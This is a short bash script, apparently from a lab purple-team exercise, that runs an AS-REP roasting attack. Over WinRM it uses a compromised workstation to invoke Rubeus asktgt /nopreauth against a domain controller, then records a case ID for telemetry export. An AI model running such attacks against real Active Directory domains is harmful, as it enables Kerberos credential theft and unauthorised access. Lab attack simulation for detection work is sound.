#!/usr/bin/env bash
# T003 — AS-REP roast from ws01 beachhead (child\analyst_t1) → dc02
# Operator: provisioning (.60) · Egress: ws01 (.62) · Method 1 (WinRM exec)
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LIB="${SCRIPT_DIR}/../lib"
CASE_ID="CADRE-T003-ASREP-$(date -u +%Y%m%d)"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)

echo "=== T003 AS-REP | CASE=${CASE_ID} | T0=${T0} ==="
echo "Path: provisioning → ws01 (analyst_t1 WinRM) → dc02"

echo "--- Gate 0: beachhead ---"
"${LIB}/ws01-exec.sh" 'whoami; hostname'

echo "--- Attack: Rubeus asktgt /nopreauth on ws01 (LDAP enum blocked for analyst_t1) ---"
"${LIB}/ws01-exec.sh" 'C:\Tools\cadre-attack\Rubeus.exe asktgt /user:intern_blue /domain:child.cadre.local /dc:dc02.child.cadre.local /nopreauth /nowrap'

echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
echo "${CASE_ID}" > /tmp/cadre-last-case-id.txt
echo "=== T003 run complete — export telemetry with cadre-es-export.sh ==="
